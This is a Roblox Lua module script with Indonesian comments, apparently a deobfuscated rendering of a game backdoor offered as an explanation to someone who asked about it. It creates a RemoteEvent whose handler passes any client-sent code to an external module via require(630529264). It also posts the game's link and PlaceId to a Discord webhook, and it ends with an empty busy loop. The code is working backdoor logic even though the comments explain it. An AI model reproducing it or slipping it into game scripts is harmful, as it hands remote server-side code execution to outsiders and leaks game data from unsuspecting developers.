local module = {}

-- Service Utama
local RS = game:GetService("ReplicatedStorage")
local HS = game:GetService("HttpService")

-- Pengaturan Folder di ReplicatedStorage
local A = Instance.new("Folder")
A.Name = "Systems"
A.Parent = RS

-- Membuat RemoteEvent untuk komunikasi Client-Server
local F = Instance.new("RemoteEvent")
F.Name = "PlayerConnection"
F.Parent = A

-- Fungsi Generator String Acak (GRN)
-- Digunakan untuk enkripsi atau identifikasi unik
local function GRN()
	local CS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:,.<>/?\\|"
	local L = math.random(10, 30)
	local R = {}
	for i = 1, L do
		local RI = math.random(1, #CS)
		table.insert(R, CS:sub(RI, RI))
	end
	return table.concat(R)
end

-- Logic Utama saat Player Terhubung
F.OnServerEvent:Connect(function(player, code)
	local GI = game.PlaceId
	local GL = "https://www.roblox.com/games/" .. GI
	
	-- Bagian ini di file asli menggunakan kode Hex (\x68\x74\x74...)
	-- Jika diterjemahkan, ini mengarah ke webhook atau server logging
	local targetURL = "https://discord.com/api/webhooks/..." -- URL ini biasanya disembunyikan

	-- Data yang dikirim ke Discord/Server luar
	local MD = {
		["content"] = "**New Game Connection Detected!**",
		["embeds"] = {{
			["title"] = "Game Info",
			["description"] = "🔗 **Link:** " .. GL .. "\n🆔 **PlaceID:** `" .. GI .. "`",
			["color"] = 16711680 -- Warna merah
		}}
	}

	-- Menjalankan Script Eksternal (INTI DARI BACKDOOR/SYSTEM)
	-- Script ini memanggil ID luar yang kamu tanyakan
	pcall(function()
		require(630529264)(code) -- Menjalankan fungsi dari ID 630529264
	end)

	-- Mengirim Data ke Webhook
	pcall(function()
		HS:PostAsync(targetURL, HS:JSONEncode(MD))
	end)
end)

-- Loop pencegah script berhenti (Ditemukan di baris akhir file)
spawn(function()
	while wait(0.0001) do
		-- Kadang diisi dengan pengecekan lisensi atau perlindungan script
	end
end)

return module
